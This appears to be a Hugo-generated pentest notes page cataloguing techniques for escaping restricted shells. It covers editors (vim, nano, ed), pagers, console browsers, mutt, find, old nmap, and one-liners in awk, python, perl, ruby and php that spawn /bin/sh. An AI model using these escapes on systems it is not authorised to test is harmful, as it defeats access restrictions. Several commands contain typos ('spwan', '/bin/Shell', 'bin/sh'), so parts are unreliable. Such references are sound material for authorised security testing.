---
### The title for the content.
title : "shell escaping"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "shell escaping"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description : "shell escaping description."
### The datetime assigned to this page.
date : 2020-03-10T16:43:46+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "shell-escaping"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight : 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

## shell escaping

Sometimes you find your self in a locked down/pseudo shell, for example some network appliance. But under the hood it might run a full unix OS. If this is the case you might be able to use some existing programs that might be available to escape from this pseudo shell.

## editors 

### vim 

```
:!/bin/sh
```

```
:set shell=/bin/sh
:shell
```

### ed

```
!'/bin/sh'
```

### ne

```
Load Prefs
```

### nano

```
CTRL+R
CTRL+X
reset; bash 1>&0 2>&0
```

## Pager


### More/Less

Open a file that is larger then your terminal. 

Run `!'sh'`

### man

Run `!'sh'`

This to works since man uses more/less.

### pinfo

press `!` followed by the command you want to run.

### Console Browsers

pagers can also be used a editors in console browsers.

#### links

`FILE > OS Shell`

#### lynx

open webpage.  
press `o`  
configure vim as editor

or

```
lynx --editor=/usr/bin/vim www.google.com
```

#### elinks

```
export EDITOR=/usr/bin/vim
```

open a site with a textbox. 
Press `ENTER` and then `F4`. 
elinks will use vim.

### mutt

open mutt  
press `!`  
enter `/bin/Shell`

### find

when ever it finds udp.xml it will cd to root and run ls.

`find . -name udp.xml -exec awk 'BEGIN {system("cd /root; ls")}' \;`

### nmap

before version r17131

```
nmap --interactive
!sh
```

## Programming Techniques

### awk

`awk 'BEGIN {system("/bin/sh")}'`

### expect

```
Expect
spwan sh
sh
```

### python

`python -c 'import os; os.system("/bin/sh");'`

### ruby

```
irb
exec 'bin/sh'
```

### perl

`perl -e 'system("sh -i")'`  
`perl -e 'exec("sh -i")'`

### php

```
php -a
exec("sh -i");
```
